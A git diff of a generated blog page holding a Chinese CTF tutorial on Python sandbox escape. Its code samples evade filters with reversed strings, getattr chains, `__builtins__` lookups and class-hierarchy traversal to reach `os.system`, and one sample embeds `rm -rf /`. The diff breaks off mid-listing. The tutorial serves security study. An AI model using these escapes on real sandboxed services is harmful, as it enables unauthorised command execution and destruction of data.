@@ -6,7 +6,7 @@
 
 <link rel='canonical' href='https://Oight.github.io/p/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/'>
 
-<link rel="stylesheet" href="/scss/style.min.0e9b0dc41309ee439f307e94fe233ae09b70f32858267ed1afae44d0ba448205.css"><meta property='og:title' content="Python沙箱逃逸">
+<link rel="stylesheet" href="/scss/style.min.cfe2632a91c7cb600e0badeaecd0da79bddaa315643726e117b52f62c13fe88c.css"><meta property='og:title' content="Python沙箱逃逸">
 <meta property='og:description' content="Python沙箱逃逸\r我们知道Python可以利用反序列化漏洞以及其他漏洞进行攻击，因此，在CTF中也会通过防火墙来进行防御。今天我们就讨论一下如何绕过防火墙来实现攻击行为，即Python的沙箱逃逸\n">
 <meta property='og:url' content='https://Oight.github.io/p/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/'>
 <meta property='og:site_name' content='Oight'>
@@ -347,7 +347,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 12 分钟
+                    阅读时长: 11 分钟
                 </time>
             </div>
         
@@ -369,26 +369,7 @@
 <p>比如在Python反序列化中，我们需要通过反序列化来让程序执行我们想让它执行的代码来实现相应的功能。在这个过程中，我们就借助了Python中的一些函数和模块来实现这些功能。</p>
 <p>同样的，为了避免安全风险，程序的设计者会想办法禁止我们利用这些危险的函数和模块。</p>
 <p>示例：（一个简单的Python沙箱）</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">python</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">python</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># 创建一个禁用危险函数的环境</span>
 </span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">safe_exec</span><span class="p">(</span><span class="n">code</span><span class="p">):</span>
 </span></span><span class="line"><span class="cl">    <span class="n">allowed_builtins</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;abs&#34;</span><span class="p">,</span> <span class="s2">&#34;max&#34;</span><span class="p">,</span> <span class="s2">&#34;min&#34;</span><span class="p">,</span> <span class="s2">&#34;print&#34;</span><span class="p">}</span>  <span class="c1"># 白名单</span>
@@ -403,9 +384,7 @@
 </span></span><span class="line"><span class="cl"><span class="c1"># 测试安全执行</span>
 </span></span><span class="line"><span class="cl"><span class="n">safe_exec</span><span class="p">(</span><span class="s2">&#34;print(&#39;Hello World&#39;)&#34;</span><span class="p">)</span>          <span class="c1"># 正常</span>
 </span></span><span class="line"><span class="cl"><span class="n">safe_exec</span><span class="p">(</span><span class="s2">&#34;open(&#39;test.txt&#39;, &#39;w&#39;)&#34;</span><span class="p">)</span>         <span class="c1"># 报错：open 不可用 </span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="python沙箱的实现原理和常见方法">Python沙箱的实现原理和常见方法
+</span></span></code></pre></div><h3 id="python沙箱的实现原理和常见方法">Python沙箱的实现原理和常见方法
 </h3><ul>
 <li>
 <p><strong>Python沙箱的核心是限制代码的执行权限</strong></p>
@@ -416,39 +395,17 @@
 <p>移除危险模块：禁用如 <code>os</code>、<code>sys</code>、<code>subprocess</code> 等模块。</p>
 <p>覆盖内置函数：替换 <code>__import__</code>、<code>open</code>、<code>eval</code> 等函数。</p>
 <p>示例：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
 </span></span><span class="line"><span class="cl"># 禁用 os 模块
 </span></span><span class="line"><span class="cl">import sys
 </span></span><span class="line"><span class="cl">sys.modules[&#39;os&#39;] = None  # 阻止导入os
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 </ul>
 <h2 id="什么是python沙箱逃逸">什么是Python沙箱逃逸
 </h2><p>Python 沙箱逃逸（Sandbox Escape）是指在一个受限制的Python执行环境（沙箱）中，通过技术手段绕过安全限制，访问或控制本应被禁止的资源（如文件系统、操作系统命令、网络等）。沙箱通常用于隔离不可信代码，但在设计不当时可能被攻击者突破。</p>
 <h3 id="常用的-python-内建函数">常用的 Python 内建函数
 </h3><p>在 Python 的内建函数中，有一些函数可以帮助我们实现任意命令执行：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">os.system()
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">os.system()
 </span></span><span class="line"><span class="cl">os.popen()
 </span></span><span class="line"><span class="cl">commands.getstatusoutput() 
 </span></span><span class="line"><span class="cl">commands.getoutput()
@@ -456,41 +413,18 @@
 </span></span><span class="line"><span class="cl">subprocess.call(command, shell=True) 
 </span></span><span class="line"><span class="cl">subprocess.Popen(command, shell=True)
 </span></span><span class="line"><span class="cl">pty.spawn()
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>可直接执行命令的模块有</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">os
+</span></span></code></pre></div><p>可直接执行命令的模块有</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">os
 </span></span><span class="line"><span class="cl">pty
 </span></span><span class="line"><span class="cl">subprocess
 </span></span><span class="line"><span class="cl">plarform
 </span></span><span class="line"><span class="cl">commands
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>有些时候，比如CTF，我们并不需要去执行命令，而是去读取目录下的flag文件即可，也就是说需要文件读取的模块来执行，常用的文件读取模块：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">file
+</span></span></code></pre></div><p>有些时候，比如CTF，我们并不需要去执行命令，而是去读取目录下的flag文件即可，也就是说需要文件读取的模块来执行，常用的文件读取模块：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">file
 </span></span><span class="line"><span class="cl">open
 </span></span><span class="line"><span class="cl">codecs
 </span></span><span class="line"><span class="cl">fileinput
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>不过其中file只在python2中执行</p>
+</span></span></code></pre></div><p>不过其中file只在python2中执行</p>
 <h2 id="常见的python沙箱逃逸方法">常见的Python沙箱逃逸方法
 </h2><p>我们上面提到，在沙箱中，我们往往无法直接利用上面的危险函数和模块，因此我们就需要导入相关模块并使用上述的函数实现命令执行。</p>
 <p>于是，Python沙箱逃逸的重点就落在了如何绕过防御措施来导入我们需要的模块并使用上述函数。</p>
@@ -499,189 +433,70 @@
 <li>
 <p>Python允许覆盖内置函数（如<code>__import__</code>、<code>open</code>、<code>eval</code> 等）或模块（如 <code>os</code>、<code>sys</code>）。
 示例：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
 </span></span><span class="line"><span class="cl"># 覆盖 __import__ 函数以绕过限制
 </span></span><span class="line"><span class="cl">__import__ = lambda x: os.system(&#34;rm -rf /&#34;)  # 恶意操作
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 </ul>
 <h3 id="2绕过导入限制">2.绕过导入限制
 </h3><h4 id="过滤库">过滤库
 </h4><p>Python导入库的形式很灵活，比如：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">过滤了import os
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">过滤了import os
 </span></span><span class="line"><span class="cl">import  os
 </span></span><span class="line"><span class="cl">import   os
 </span></span><span class="line"><span class="cl">import    os
 </span></span><span class="line"><span class="cl">...
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>如果多个空格也过滤了，Python 能够 import 的可不止 import，还有 <code>__import__</code>：<code>__import__('os')</code>，<code>__import__</code>被干了还有 <code>importlib</code>：<code>importlib.import_module('os').system('ls')</code></p>
+</span></span></code></pre></div><p>如果多个空格也过滤了，Python 能够 import 的可不止 import，还有 <code>__import__</code>：<code>__import__('os')</code>，<code>__import__</code>被干了还有 <code>importlib</code>：<code>importlib.import_module('os').system('ls')</code></p>
 <p>如果过滤了模块名，我们也可以使用路径引入的方式来导入模块：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; import sys
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; import sys
 </span></span><span class="line"><span class="cl">&gt;&gt;&gt; sys.modules[&#39;os&#39;]=&#39;/usr/lib/python2.7/os.py&#39;
 </span></span><span class="line"><span class="cl">&gt;&gt;&gt; import os
 </span></span><span class="line"><span class="cl">&gt;&gt;&gt;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>如果 import 也被过滤，我们同样可以使用路径引入的方式来导入模块</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">plaintext
+</span></span></code></pre></div><p>如果 import 也被过滤，我们同样可以使用路径引入的方式来导入模块</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">plaintext
 </span></span><span class="line"><span class="cl">execfile(&#39;/usr/lib/python2.7/os.py&#39;)
 </span></span><span class="line"><span class="cl">system(&#39;ls&#39;)
 </span></span><span class="line"><span class="cl">// 只能在Python2中使用execfile
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>或是</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+</span></span></code></pre></div><p>或是</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
 </span></span><span class="line"><span class="cl">with open(&#39;/usr/lib/python3.6/os.py&#39;,&#39;r&#39;) as f:
 </span></span><span class="line"><span class="cl">    exec(f.read())
 </span></span><span class="line"><span class="cl">system(&#39;ls&#39;)
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>这种方式 Python2 和 Python3 都可以使用，但是使用这种方式都需要已知库的路径，在大多数的环境下，库都是默认路径。</p>
+</span></span></code></pre></div><p>这种方式 Python2 和 Python3 都可以使用，但是使用这种方式都需要已知库的路径，在大多数的环境下，库都是默认路径。</p>
 <h4 id="字符串处理绕过过滤">字符串处理绕过过滤
 </h4><p>代码中要是出现 os，直接不让运行。那么可以利用字符串的各种变化来引入 os：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__import__(&#39;so&#39;[::-1]).system(&#39;ls&#39;)
-</span></span></code></pre></td></tr></table>
-</div>
-</div><hr>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">b = &#39;o&#39;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__import__(&#39;so&#39;[::-1]).system(&#39;ls&#39;)
+</span></span></code></pre></div><hr>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">b = &#39;o&#39;
 </span></span><span class="line"><span class="cl">a = &#39;s&#39;
 </span></span><span class="line"><span class="cl">__import__(a+b).system(&#39;ls&#39;)
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>还可以利用 eval 或者 exec：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; eval(&#39;)&#34;imaohw&#34;(metsys.)&#34;so&#34;(__tropmi__&#39;[::-1])
+</span></span></code></pre></div><p>还可以利用 eval 或者 exec：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; eval(&#39;)&#34;imaohw&#34;(metsys.)&#34;so&#34;(__tropmi__&#39;[::-1])
 </span></span><span class="line"><span class="cl">macr0phag3
 </span></span><span class="line"><span class="cl">0
 </span></span><span class="line"><span class="cl">&gt;&gt;&gt; exec(&#39;)&#34;imaohw&#34;(metsys.so ;so tropmi&#39;[::-1])
 </span></span><span class="line"><span class="cl">macr0phag3
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>顺便说一下，eval、exec 都是相当危险的函数，exec 比 eval 还要危险，它们一定要过滤，因为字符串有很多变形的方式，对字符串的处理可以有：逆序、变量拼接、base64、hex、rot13…等等，太多了</p>
+</span></span></code></pre></div><p>顺便说一下，eval、exec 都是相当危险的函数，exec 比 eval 还要危险，它们一定要过滤，因为字符串有很多变形的方式，对字符串的处理可以有：逆序、变量拼接、base64、hex、rot13…等等，太多了</p>
 <h5 id="过滤system">过滤system
 </h5><p>我们可以发现，如果使用 os 模块来进行攻击，都会使用到 system 函数，如果过滤了 system 函数，是否我们就无能为力了？实则不然， os 中能执行命令的函数有很多：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">print(os.system(&#39;whoami&#39;))
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">print(os.system(&#39;whoami&#39;))
 </span></span><span class="line"><span class="cl">print(os.popen(&#39;whoami&#39;).read()) 
 </span></span><span class="line"><span class="cl">print(os.popen2(&#39;whoami&#39;).read()) # 2.x
 </span></span><span class="line"><span class="cl">print(os.popen3(&#39;whoami&#39;).read()) # 2.x
 </span></span><span class="line"><span class="cl">print(os.popen4(&#39;whoami&#39;).read()) # 2.x
 </span></span><span class="line"><span class="cl">...  
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>对于过滤函数的问题，我们可以通过 getattr 拿到对象的方法、属性：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import os
+</span></span></code></pre></div><p>对于过滤函数的问题，我们可以通过 getattr 拿到对象的方法、属性：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import os
 </span></span><span class="line"><span class="cl">getattr(os, &#39;metsys&#39;[::-1])(&#39;whoami&#39;)
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>不让出现 import也没事：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; getattr(getattr(__builtins__, &#39;__tropmi__&#39;[::-1])(&#39;so&#39;[::-1]), &#39;metsys&#39;[::-1])(&#39;whoami&#39;)
+</span></span></code></pre></div><p>不让出现 import也没事：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; getattr(getattr(__builtins__, &#39;__tropmi__&#39;[::-1])(&#39;so&#39;[::-1]), &#39;metsys&#39;[::-1])(&#39;whoami&#39;)
 </span></span><span class="line"><span class="cl">macr0phag3
 </span></span><span class="line"><span class="cl">0
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>这个方法同样可以用于逃逸过滤 import 的沙箱。与 getattr 相似的还有 <code>__getattr__</code>、<code>__getattribute__</code>，它们自己的区别就是 getattr 相当于  class.attr，都是获取类属性/方法的一种方式，在获取的时候会触发<code>__getattribute__</code>，如果<code>__getattribute__</code>找不到，则触发<code>__getattr__</code>，还找不到则报错。</p>
+</span></span></code></pre></div><p>这个方法同样可以用于逃逸过滤 import 的沙箱。与 getattr 相似的还有 <code>__getattr__</code>、<code>__getattribute__</code>，它们自己的区别就是 getattr 相当于  class.attr，都是获取类属性/方法的一种方式，在获取的时候会触发<code>__getattribute__</code>，如果<code>__getattribute__</code>找不到，则触发<code>__getattr__</code>，还找不到则报错。</p>
 <h5 id="builtinsbuiltin与builtins">builtins、builtin与builtins
 </h5><p>先说一下，builtin、builtins，__builtin__与__builtins__的区别：首先我们知道，在 Python 中，有很多函数不需要任何 import 就可以直接使用，例如chr、open。之所以可以这样，是因为 Python  有个叫内建模块（或者叫内建命名空间）的东西，它有一些常用函数，变量和类。</p>
 <p>在 2.x 版本中，内建模块被命名为__builtin__，到了 3.x 就成了 builtins。它们都需要 import 才能查看,__builtins__两者都有，实际上是__builtin__和builtins 的引用。它不需要导入</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span><span class="lnt">9
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; &#39;__import__&#39; in dir(__builtins__)
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; &#39;__import__&#39; in dir(__builtins__)
 </span></span><span class="line"><span class="cl">True
 </span></span><span class="line"><span class="cl">&gt;&gt;&gt; __builtins__.__dict__[&#39;__import__&#39;](&#39;os&#39;).system(&#39;whoami&#39;)
 </span></span><span class="line"><span class="cl">macr0phag3
@@ -690,36 +505,13 @@
 </span></span><span class="line"><span class="cl">True
 </span></span><span class="line"><span class="cl">&gt;&gt;&gt; &#39;execfile&#39; in dir(__builtins__)
 </span></span><span class="line"><span class="cl">True  
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>我们看到里面有很多我们可以利用的危险函数</p>
+</span></span></code></pre></div><p>我们看到里面有很多我们可以利用的危险函数</p>
 <h5 id="通过继承关系绕逃逸">通过继承关系绕逃逸
 </h5><p>Python 中新式类都有个属性，叫__mro__，是个元组，记录了继承关系：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__
 </span></span><span class="line"><span class="cl">(&lt;class &#39;str&#39;&gt;, &lt;class &#39;object&#39;&gt;)
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>类的实例在获取 <strong>class</strong> 属性时会指向该实例对应的类。可以看到，’’属于 str类，它继承了 object 类，这个类是所有类的超类。具有相同功能的还有__base__和__bases__。需要注意的是，经典类需要指明继承 object 才会继承它，否则是不会继承的：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span><span class="lnt">9
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; class test:
+</span></span></code></pre></div><p>类的实例在获取 <strong>class</strong> 属性时会指向该实例对应的类。可以看到，’’属于 str类，它继承了 object 类，这个类是所有类的超类。具有相同功能的还有__base__和__bases__。需要注意的是，经典类需要指明继承 object 才会继承它，否则是不会继承的：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; class test:
 </span></span><span class="line"><span class="cl">...     pass
 </span></span><span class="line"><span class="cl">...
 </span></span><span class="line"><span class="cl">&gt;&gt;&gt; test.__bases__
@@ -728,37 +520,13 @@
 </span></span><span class="line"><span class="cl">...
 </span></span><span class="line"><span class="cl">&gt;&gt;&gt; test.__bases__
 </span></span><span class="line"><span class="cl">(&lt;type &#39;object&#39;&gt;,)
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>那么知道这个有什么用呢？</p>
+</span></span></code></pre></div><p>那么知道这个有什么用呢？</p>
 <p>由于没法直接引入 os，那么假如有个库叫oos，在oos中引入了os，那么我们就可以通过__globals__拿到 os（__globals__是函数所在的全局命名空间中所定义的全局变量）。例如，site 这个库就有 os：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; import site
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; import site
 </span></span><span class="line"><span class="cl">&gt;&gt;&gt; site.os
 </span></span><span class="line"><span class="cl">&lt;module &#39;os&#39; from &#39;/Users/macr0phag3/.pyenv/versions/3.6.5/lib/python3.6/os.py&#39;&gt;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>也就是说，能引入 site 的话，就相当于有 os。那如果 site 也被禁用了呢？没事，本来也就没打算直接 import site。可以利用 reload，变相加载 os：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span><span class="lnt">9
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">import</span> <span class="n">site</span>
+</span></span></code></pre></div><p>也就是说，能引入 site 的话，就相当于有 os。那如果 site 也被禁用了呢？没事，本来也就没打算直接 import site。可以利用 reload，变相加载 os：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">import</span> <span class="n">site</span>
 </span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">os</span>
 </span></span><span class="line"><span class="cl"><span class="n">Traceback</span> <span class="p">(</span><span class="n">most</span> <span class="n">recent</span> <span class="n">call</span> <span class="n">last</span><span class="p">):</span>
 </span></span><span class="line"><span class="cl"><span class="ne">File</span> <span class="s2">&#34;&lt;stdin&gt;&#34;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1</span><span class="p">,</span> <span class="ow">in</span> <span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span>
@@ -767,96 +535,8 @@
 </span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">macr0phag3</span>
 </span></span><span class="line"><span class="cl"><span class="mi">0</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>还有，既然所有的类都继承的object，那么我们先用__subclasses__看看它的子类，以 2.x 为例：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
